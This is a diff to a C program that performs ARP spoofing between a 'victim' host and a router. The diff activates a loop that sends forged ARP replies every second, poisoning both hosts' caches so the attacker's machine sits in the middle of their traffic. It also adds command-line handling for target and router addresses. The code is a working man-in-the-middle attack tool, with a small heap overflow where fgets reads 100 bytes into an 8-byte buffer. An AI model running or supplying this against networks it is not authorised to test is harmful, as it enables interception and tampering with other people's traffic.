@@ -97,24 +97,29 @@ void print_mac_addr(uint8_t *mac) {
 
 char* get_mac_addr(int socket, char *interface) {
     uint8_t *src_mac;
+    char *mac;
     struct ifreq ifr;
 
     memset(&ifr, 0, sizeof (ifr));
     bzero(&ifr, sizeof (ifr));
 
     src_mac = allocate_ustrmem(ETHER_ADDR_LEN);
+    mac = allocate_strmem(MAC_ADDR_STRLEN);
 
     strncpy((char *) ifr.ifr_name, interface, IFNAMSIZ);
 
     if ((ioctl(socket, SIOCGIFHWADDR, &ifr)) == -1) {
-        submit_log("10. create_raw_socket(): [%s]\n", "Error getting HW ADDR");
+        submit_log("create_raw_socket(): [%s]\n", "Error getting HW ADDR");
         exit(EXIT_FAILURE);
     }
     memcpy(src_mac, ifr.ifr_hwaddr.sa_data, ETHER_ADDR_LEN * sizeof (uint8_t));
 
-    print_mac_addr(src_mac);
+    sprintf(mac, "%02x:%02x:%02x:%02x:%02x:%02x", src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5]);
 
-    return src_mac;
+    submit_log("Interface: %s\n", interface);
+    submit_log("MAC ADDR: %s\n", mac);
+
+    return mac;
 }
 
 char* get_ip_addr(int socket, char *interface) {
@@ -161,7 +166,6 @@ int main(int argc, char **argv) {
                 case 'i':
                     interface = optarg;
                     break;
-                    //fprintf(stderr, "Interface selected %s\n", interface);
                 case 'u':
                     // flag for uni-directional
                     unidir = 1;
@@ -180,6 +184,12 @@ int main(int argc, char **argv) {
                     if (optopt == 'i') {
                         fprintf(stderr, "Option -%c requires an argument.\n", optopt);
                         fprintf(stderr, "[USAGE] => %s -i \"[wlan0 or etho0]\" \n", argv[0]);
+                    } else if (optopt == 'r') {
+                        fprintf(stderr, "Option -%c requires an argument.\n", optopt);
+                        fprintf(stderr, "[USAGE] => %s -r {router_ip-router_mac} \n", argv[0]);
+                    } else if (optopt == 't') {
+                        fprintf(stderr, "Option -%c requires an argument.\n", optopt);
+                        fprintf(stderr, "[USAGE] => %s -t {target_ip-target_mac} \n", argv[0]);
                     } else if (isprint(optopt)) {
                         fprintf(stderr, "Unknown option `-%c'.\n", optopt);
                     } else {
@@ -205,10 +215,13 @@ int main(int argc, char **argv) {
     MY_MAC_ADDRS = get_mac_addr(RAW, interface);
     MY_IP_ADDRS = get_ip_addr(RAW, interface);
 
+    submit_log("MY IP ADDR: %s", MY_IP_ADDRS);
+    submit_log("MY MAC ADDR: %s", MY_MAC_ADDRS);
+
     if (set_router == 1) {
         ROUTER_IP_ADDRS = strtok(router, "-");
         ROUTER_MAC_ADDRS = strtok(NULL, "-");
-        
+
         submit_log("R IP ADDR: %s", ROUTER_IP_ADDRS);
         submit_log("R MAC ADDR: %s", ROUTER_MAC_ADDRS);
     }
@@ -216,7 +229,7 @@ int main(int argc, char **argv) {
     if (set_target == 1) {
         VICTIM_IP_ADDRS = strtok(victim, "-");
         VICTIM_MAC_ADDRS = strtok(NULL, "-");
-        
+
         submit_log("V IP ADDR: %s", VICTIM_IP_ADDRS);
         submit_log("V MAC ADDR: %s", VICTIM_MAC_ADDRS);
     }
@@ -252,42 +265,42 @@ int main(int argc, char **argv) {
     }
 
 
-//    while (TRUE) {
-//        // ethernet = create_eth_header(ROUTER_MAC_ADDR, VICTIM_MAC_ADDR, ETHERTYPE_ARP);
-//        // arp = create_arp_header(MY_MAC_ADDRS, ROUTER_IP_ADDR, BROADCAST_MAC_ADDR, VICTIM_IP_ADDR, ARP_REQUEST);
-//        // send_packet(ethernet, arp, interface);
-//
-//        // ethernet = create_eth_header(VICTIM_MAC_ADDR, ROUTER_MAC_ADDR, ETHERTYPE_ARP);
-//        // arp = create_arp_header(MY_MAC_ADDRS, VICTIM_IP_ADDR, BROADCAST_MAC_ADDR, ROUTER_IP_ADDR, ARP_REQUEST);
-//        // send_packet(ethernet, arp, interface);
-//
-//        ethernet = create_eth_header(MY_MAC_ADDRS, VICTIM_MAC_ADDR, ETHERTYPE_ARP);
-//        arp = create_arp_header(MY_MAC_ADDRS, ROUTER_IP_ADDR, VICTIM_MAC_ADDR, VICTIM_IP_ADDR, ARP_REPLY);
-//        send_packet(ethernet, arp, interface);
-//
-//        ethernet = create_eth_header(MY_MAC_ADDRS, ROUTER_MAC_ADDR, ETHERTYPE_ARP);
-//        arp = create_arp_header(MY_MAC_ADDRS, VICTIM_IP_ADDR, ROUTER_MAC_ADDR, ROUTER_IP_ADDR, ARP_REPLY);
-//        send_packet(ethernet, arp, interface);
-//
-//        sleep(1);
-//
-//        config = fopen(CONFIG_FILE_LOC, "r");
-//        exitValue = malloc(sizeof (char *));
-//        rewind(config); // Seek to the beginning of the file
-//        if (fgets(exitValue, 100, config) != NULL) {
-//            fprintf(stdout, "%c\n", exitValue[0]);
-//            fflush(stdout);
-//
-//            if (exitValue[0] == '1') {
-//                fprintf(stdout, "Exiting.....\n");
-//                break;
-//            }
-//        }
-//
-//        free(exitValue);
-//        fclose(config);
-//
-//    }
+    while (TRUE) {
+        // ethernet = create_eth_header(ROUTER_MAC_ADDR, VICTIM_MAC_ADDR, ETHERTYPE_ARP);
+        // arp = create_arp_header(MY_MAC_ADDRS, ROUTER_IP_ADDR, BROADCAST_MAC_ADDR, VICTIM_IP_ADDR, ARP_REQUEST);
+        // send_packet(ethernet, arp, interface);
+
+        // ethernet = create_eth_header(VICTIM_MAC_ADDR, ROUTER_MAC_ADDR, ETHERTYPE_ARP);
+        // arp = create_arp_header(MY_MAC_ADDRS, VICTIM_IP_ADDR, BROADCAST_MAC_ADDR, ROUTER_IP_ADDR, ARP_REQUEST);
+        // send_packet(ethernet, arp, interface);
+
+        ethernet = create_eth_header(MY_MAC_ADDRS, VICTIM_MAC_ADDRS, ETHERTYPE_ARP);
+        arp = create_arp_header(MY_MAC_ADDRS, ROUTER_IP_ADDRS, VICTIM_MAC_ADDRS, VICTIM_IP_ADDRS, ARP_REPLY);
+        send_packet(ethernet, arp, interface);
+
+        ethernet = create_eth_header(MY_MAC_ADDRS, ROUTER_MAC_ADDRS, ETHERTYPE_ARP);
+        arp = create_arp_header(MY_MAC_ADDRS, VICTIM_IP_ADDRS, ROUTER_MAC_ADDRS, ROUTER_IP_ADDRS, ARP_REPLY);
+        send_packet(ethernet, arp, interface);
+
+        sleep(1);
+
+        config = fopen(CONFIG_FILE_LOC, "r");
+        exitValue = malloc(sizeof (char *));
+        rewind(config); // Seek to the beginning of the file
+        if (fgets(exitValue, 100, config) != NULL) {
+            fprintf(stdout, "%c\n", exitValue[0]);
+            fflush(stdout);
+
+            if (exitValue[0] == '1') {
+                fprintf(stdout, "Exiting.....\n");
+                break;
+            }
+        }
+
+        free(exitValue);
+        fclose(config);
+
+    }
 
     return 0;
 }
